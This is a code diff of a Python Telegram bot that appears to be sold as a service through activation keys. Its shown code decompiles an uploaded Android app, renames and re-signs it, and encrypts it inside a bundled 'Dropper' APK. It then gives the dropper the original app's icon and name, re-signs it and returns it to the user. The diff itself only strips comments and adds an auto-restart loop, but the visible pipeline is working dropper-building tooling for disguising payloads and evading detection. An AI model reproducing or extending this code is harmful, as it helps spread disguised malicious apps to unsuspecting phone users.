@@ -235,7 +235,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             f.write(apk_data)
         del apk_data
 
-        # ---- ১. ইউজার APK ডিকম্পাইল ----
         await send_progress(chat_id, "📖 Decoding user APK...", context)
         decoded_user = os.path.join(work_dir, 'decoded_user')
         proc = subprocess.run(
@@ -247,7 +246,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await send_progress(chat_id, "✅ User APK decoded.", context)
 
-        # নাম ও আইকন কপি (আমরা res_user থেকে icon কপি করে রাখব)
         app_name = "App"
         strings_path = os.path.join(decoded_user, 'res/values/strings.xml')
         if os.path.exists(strings_path):
@@ -262,7 +260,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             except:
                 pass
 
-        # icons কপি করে work_dir-এ রাখি (যাতে পরে Dropper-এ কপি করতে পারি)
         icons_temp = os.path.join(work_dir, 'icons')
         os.makedirs(icons_temp, exist_ok=True)
         res_user = os.path.join(decoded_user, 'res')
@@ -277,7 +274,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                             if f.endswith('.png'):
                                 shutil.copy2(os.path.join(src, f), dst)
 
-        # শুধু package অ্যাট্রিবিউট পরিবর্তন
         await send_progress(chat_id, f"🔧 Changing package name to {TARGET_PACKAGE}...", context)
         manifest_path = os.path.join(decoded_user, 'AndroidManifest.xml')
         if os.path.exists(manifest_path):
@@ -287,7 +283,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             with open(manifest_path, 'w', encoding='utf-8') as f:
                 f.write(content)
 
-        # রিকম্পাইল ইউজার APK
         await send_progress(chat_id, "🛠 Rebuilding user APK...", context)
         modified_apk = os.path.join(work_dir, 'modified_user.apk')
         proc = subprocess.run(
@@ -299,7 +294,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await send_progress(chat_id, "✅ User APK rebuilt.", context)
 
-        # সাইন ইউজার APK
         await send_progress(chat_id, "🔑 Signing user APK...", context)
         keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
         if not os.path.exists(keystore):
@@ -316,15 +310,12 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await send_progress(chat_id, "✅ User APK signed.", context)
 
-        # ইউজার APK এনক্রিপ্ট
         await send_progress(chat_id, "🔐 Encrypting user APK...", context)
         with open(modified_apk, 'rb') as f:
             modified_apk_data = f.read()
-        # এখন decoded_user ডিলিট করে দিই (মেমোরি)
         shutil.rmtree(decoded_user, ignore_errors=True)
         gc.collect()
 
-        # ---- ২. Dropper প্রসেসিং ----
         await send_progress(chat_id, "📖 Decoding Dropper APK...", context)
         dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
         if not os.path.exists(dropper_apk):
@@ -340,14 +331,12 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await send_progress(chat_id, "✅ Dropper APK decoded.", context)
 
-        # অ্যাসেট রিপ্লেস
         await send_progress(chat_id, "📦 Replacing assets...", context)
         assets_dir = os.path.join(decoded_dropper, 'assets')
         process_encryption(modified_apk_data, assets_dir)
         del modified_apk_data
         gc.collect()
 
-        # ইউজারের আইকন কপি
         await send_progress(chat_id, "🎨 Copying user icon/name...", context)
         res_dropper = os.path.join(decoded_dropper, 'res')
         if os.path.exists(icons_temp):
@@ -359,7 +348,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                     for f in os.listdir(src):
                         if f.endswith('.png'):
                             shutil.copy2(os.path.join(src, f), dst)
-        # strings.xml আপডেট
         strings_dst = os.path.join(decoded_dropper, 'res/values/strings.xml')
         if os.path.exists(strings_dst):
             try:
@@ -374,7 +362,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             except:
                 pass
 
-        # Dropper manifest label/icon
         manifest_dropper = os.path.join(decoded_dropper, 'AndroidManifest.xml')
         if os.path.exists(manifest_dropper):
             with open(manifest_dropper, 'r', encoding='utf-8') as f:
@@ -390,7 +377,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             with open(manifest_dropper, 'w', encoding='utf-8') as f:
                 f.write(content)
 
-        # রিকম্পাইল Dropper
         await send_progress(chat_id, "🛠 Rebuilding Dropper APK...", context)
         output_apk = os.path.join(work_dir, 'output.apk')
         proc = subprocess.run(
@@ -402,7 +388,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await send_progress(chat_id, "✅ Dropper APK rebuilt.", context)
 
-        # অ্যালাইনমেন্ট
         await send_progress(chat_id, "📦 Aligning APK...", context)
         aligned_apk = os.path.join(work_dir, 'aligned.apk')
         try:
@@ -415,7 +400,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await send_progress(chat_id, "✅ APK aligned.", context)
 
-        # সাইন Dropper
         await send_progress(chat_id, "🔑 Signing Dropper APK...", context)
         if not await sign_apk(aligned_apk, chat_id, context, keystore, passwd):
             return
@@ -423,7 +407,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
 
         final_apk = aligned_apk
 
-        # ফাইল সাইজ চেক
         file_size = os.path.getsize(final_apk)
         file_size_mb = file_size / (1024 * 1024)
         if file_size_mb > 50:
@@ -436,7 +419,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
 
         await send_progress(chat_id, f"📦 Sending APK ({file_size_mb:.1f} MB)...", context)
 
-        # পাঠানো
         try:
             with open(final_apk, 'rb') as f:
                 await context.bot.send_document(
@@ -597,33 +579,38 @@ def run_flask():
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
 
+# ----- পরিবর্তিত অংশ (অটো-রিস্টার্ট) -----
 def run_bot():
-    try:
-        init_db()
-        if not BOT_TOKEN:
-            logger.error("BOT_TOKEN missing! Bot will not start.")
-            return
+    while True:
+        try:
+            init_db()
+            if not BOT_TOKEN:
+                logger.error("BOT_TOKEN missing! Bot will not start.")
+                return
 
-        application = (
-            Application.builder()
-            .token(BOT_TOKEN)
-            .read_timeout(600)
-            .write_timeout(600)
-            .connect_timeout(60)
-            .build()
-        )
-        application.add_handler(CommandHandler("start", start))
-        application.add_handler(CommandHandler("help", help_command))
-        application.add_handler(CommandHandler("activate", activate))
-        application.add_handler(CommandHandler("genkey", genkey_command))
-        application.add_handler(CallbackQueryHandler(button_handler))
-        application.add_handler(MessageHandler(filters.Document.ALL, upload_handler))
+            application = (
+                Application.builder()
+                .token(BOT_TOKEN)
+                .read_timeout(600)
+                .write_timeout(600)
+                .connect_timeout(60)
+                .build()
+            )
+            application.add_handler(CommandHandler("start", start))
+            application.add_handler(CommandHandler("help", help_command))
+            application.add_handler(CommandHandler("activate", activate))
+            application.add_handler(CommandHandler("genkey", genkey_command))
+            application.add_handler(CallbackQueryHandler(button_handler))
+            application.add_handler(MessageHandler(filters.Document.ALL, upload_handler))
 
-        logger.info("✅ Bot starting polling...")
-        application.run_polling(drop_pending_updates=True)
-
-    except Exception as e:
-        logger.error(f"Bot crashed: {e}")
+            logger.info("✅ Bot starting polling...")
+            application.run_polling(drop_pending_updates=True)
+            # যদি এখানে পৌঁছায়, মানে polling থেমে গেছে (যেমন Conflict)
+            logger.warning("⚠️ Bot polling stopped unexpectedly. Restarting in 5 seconds...")
+            time.sleep(5)
+        except Exception as e:
+            logger.error(f"❌ Bot crashed: {e}. Restarting in 10 seconds...")
+            time.sleep(10)
 
 if __name__ == "__main__":
     flask_thread = threading.Thread(target=run_flask, daemon=True)
